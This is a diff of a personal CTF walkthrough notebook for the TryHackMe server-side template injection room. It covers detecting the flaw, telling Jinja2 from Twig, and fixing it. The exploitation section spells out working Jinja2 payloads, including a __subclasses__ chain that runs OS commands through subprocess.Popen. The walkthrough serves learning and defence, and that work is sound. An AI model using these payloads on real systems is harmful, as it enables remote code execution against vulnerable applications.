@@ -1,6 +1,6 @@
 
-    INTRO:
---------------
+# INTRO:
+
 
 This walkthrough is based on the walkthrough 
 provided in THM => tryhackme.com/room/learnssti
@@ -24,9 +24,7 @@ smarty + twig ---> php based template engies
 jinja2 + mako ---> python based template engies
 
 
-      Flask python package of template
-       engine code snipper example :
----------------------------------------------   
+Flask & Jinja code snippet example
 
 ```
    from flask import Flask, render_template_string
@@ -46,9 +44,8 @@ jinja2 + mako ---> python based template engies
 
 
 
-------------------------
-     Detection :
-------------------------
+# Detection :
+
 most of template engines use special characters such
 as these  ${{<%[%'"}}%  to define types of templates
 
@@ -56,7 +53,7 @@ To understand more about the characters used i recommend
 to view the documentation of each template engine you are
 dealing with in your pentesting.
 
-# NOTE - to learn more about the syntax of templates in such
+> NOTE - to learn more about the syntax of templates in such
 frameworks follow the documentation links in the syntax section
 
 
@@ -69,10 +66,10 @@ To start detecting error automaticly you would initiate fuzzing via
 tools like wfuzz / ffuz with special characters / wordlists containing 
 such characters mentioned before hoping until an error acheived.
 
-# Note - think of it like error sqli or htmli before xss detection 
-# Note - sometimes if you are lucky you would get a detailed error explaining
+> Note - think of it like error sqli or htmli before xss detection 
+> Note - sometimes if you are lucky you would get a detailed error explaining
    	 what termplate engine (and version) is used in the back-end
-# Note - there are prepared fuzzing wordlists/tools in kali & github.
+> Note - there are prepared fuzzing wordlists/tools in kali & github.
 
 	> ssti payload wordlist
 	---->
@@ -96,7 +93,7 @@ fully detailed errors are very rare & inorder to detect what
 kind of template engine is being used in the back-end you 
 could perform a series of SSTI payloads to acheive this.
 
-# to do so look at the file : "template engine desicion tee.jpg"
+> to do so look at the file : "template engine desicion tee.jpg"
 
 follow the payload tree on the lab provided in the ssti room in THM.
 https://tryhackme.com/room/learnssti
@@ -107,11 +104,11 @@ by the engine while red arrow means the payload returns as is.
 
 
 
-# Note that when using the decision tree photo to decide
+> Note that when using the decision tree photo to decide
   on which template framework is being used in the labs
   provided in the THM ssti room we reach a split in the road.
   
-# we can either understand its the 'jinja' OR 'twig' framework
+> we can either understand its the 'jinja' OR 'twig' framework
   in this case we can decide which one is being used by the
   the programming language the framework is based upon.
   
@@ -131,7 +128,7 @@ this means that the next template --> {{7 * '7'}}
 in jinja2 (python based) the injection will return ---> 7777777
 in twig (php based) the injection will return ---> 49
 
-# this happens because eventually the template payload is
+> this happens because eventually the template payload is
   evaluated by the interpeter / compiler of the programming 
   language before the framework does template parsing...
 
@@ -167,9 +164,9 @@ https://jinja.palletsprojects.com/en/2.11.x/templates/#line-statements
 
 
 
-# NOTE - both variable & block templates evaluate python code
+> NOTE - both variable & block templates evaluate python code
   	 in the case of jinja templae engine framework. 
-# NOTE - Block codes can have their own scope & has unique code syntax
+> NOTE - Block codes can have their own scope & has unique code syntax
 	 which is diffrent than pythons but can evaluate some [this will
 	 help later in the exploitation section].
 
@@ -186,8 +183,8 @@ https://documentation.bloomreach.com/engagement/docs/jinjablocks
 
 
 
-	  Exploitation :
----------------------------------------
+# Exploitation :
+
 
 As every adversary the most wanted thing to achieve by a vulnerability
 eventually is Remote Code Execution. since were using jinja (python based
@@ -195,26 +192,26 @@ template framework) we need to know python OS command execution methods.
 
 
             
-# Method 1
+> Method 1
 import os
 os.system("whoami")
 
-# Method 2
+> Method 2
 import os
 os.popen("whoami").read()
 
-# Method 3
+> Method 3
 import subprocess
 subprocess.Popen("whoami", shell=True, stdout=-1).communicate()
 
 
 
-  CTF POC :
-==============  
-# Method 1
+# CTF POC :
+  
+> Method 1
 http://MACHINE_IP:5000/profile/{% import os ; os.system("whoami") }}
 
-# Method 2
+> Method 2
 http://MACHINE_IP:5000/profile/{% import os %}{{ os.system("whoami") }}
 
 Note: Jinja2 is essentially a sub language of Python that doesn't integrate the import statement, which is why the above does not work. (From THM)
@@ -223,8 +220,7 @@ Note: the only type of import keywords found in jinja were import/include
       but it will only work on template/macros files (.j2) 
       
       
-      
-# Method 3  
+> Method 3  
 http://MACHINE_IP:5000/profile/{{ ''.__class__ }}.
 ===> self.__class__ is a reference to the type of the current instance.
 ===> refrence: https://stackoverflow.com/questions/20599375/what-is-the-purpose-of-checking-self-class
@@ -281,7 +277,7 @@ http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] 
 ===> refrence: https://www.geeksforgeeks.org/python-subprocess-module/
 ===> this payload response will return:
      Welcome to the profile of <class 'subprocess.Popen'>!
-#    NOTE that calling a refrenced method/class via accessing its name
+>    NOTE that calling a refrenced method/class via accessing its name
      via the __class__ / __mro__ / __subclasses__ keywords will execute it
 
 
@@ -316,13 +312,13 @@ http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401](
      refrence : https://www.simplilearn.com/tutorials/python-tutorial/subprocess-in-python
      
 ===> refer to links in refrences above for further detail/better explanations
-     # "whoami" ---> OS command passed as a string
-     # shell=True ---> Means the command will run on what the $SHELL is set to
+     > "whoami" ---> OS command passed as a string
+     > shell=True ---> Means the command will run on what the $SHELL is set to
      		     & will have to obligate the rules of the binary set in $SHELL
      		     in windows systems, it just means cmd.exe so it just sucks 
      		     youll have to follow the shell syntax requirments such
      		     as indentations, escaping, etc. (POSIX Rules)
-     # stdout=-1 ---> as mentioned in the open-source code of the popen function from 
+     > stdout=-1 ---> as mentioned in the open-source code of the popen function from 
      		    the subprocess library when strout is set to -1 it means the stdout
      		    of the command running on a shell will be redirected to the parent  
      		    process file handels which in this case is the web app and back to us
@@ -330,7 +326,7 @@ http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401](
 
 		    stdout can be set to either a subprocess.PIPE (look at refrences)/file
 		    
-     # .communicate() ---> is the primary call that reads all the process's inputs and
+     > .communicate() ---> is the primary call that reads all the process's inputs and
                            outputs. without it the payload respons will only return the 
                            object memory address location instead of the errors\output...
 
@@ -355,16 +351,18 @@ http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401](
 
        Remediation :
 ----------------------------
-
-# Insecure: Concatenating input
+```
+Insecure: Concatenating input
 template = f"<h1>Welcome to the profile of {user}!</h1>"
 return render_template_string(template)
-
+```
+```
 # Secure: Passing input as data
 template = "<h1>Welcome to the profile of {{ user }}!</h1>"
 return render_template_string(template, user=user)
+```
 
-  1st Payload :
+1st Payload :
 =================
 /profile/{7*7}
 
@@ -378,7 +376,7 @@ In snippet 1, if the user variable was controlled by a malicious user, they coul
 
 
 
-  2nd Payload :
+2nd Payload :
 =================
 /profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}
 
@@ -419,7 +417,7 @@ profile/{{ ''.__class__.__mro__[1].__subclasses__()[401](\"whoami\", shell=True,
 
 
 
-# another defence mechanism (regex)
+> another defence mechanism (regex)
 ```      
 import re
 
@@ -441,8 +439,8 @@ The command will be treated as a string and won't execute arbitrary code. Keep i
 
 
 
-SSTI Prevention (Suggested by chatGPT) :
-Here are some considerations:
+Approach on SSTI Prevention :
+=================================
 
 1. Context Awareness: It's important to be aware of the context in which user input is being used. Different contexts may require different security measures. For example, user input used in a shell command requires different handling compared to user input used in a web page template.
 2. Whitelist Allowed Inputs: If possible, consider using a whitelist approach. Only allow specific inputs or patterns that are known to be safe.
@@ -476,10 +474,10 @@ in the advanced SSTI guide (gitlab)
 https://0x1.gitlab.io/web-security/Server-Side-Template-Injection/#basic-injection
 
 it will include :
-# automated tools
-# payloads examples (divided by template framework)
-# multiple aproaches (divided by template framework)
-# mitigation & bypass
+1) automated tools
+2) payloads examples (divided by template framework)
+3) multiple aproaches (divided by template framework)
+4) mitigation & bypass
 
 
 > more refrences : ---->
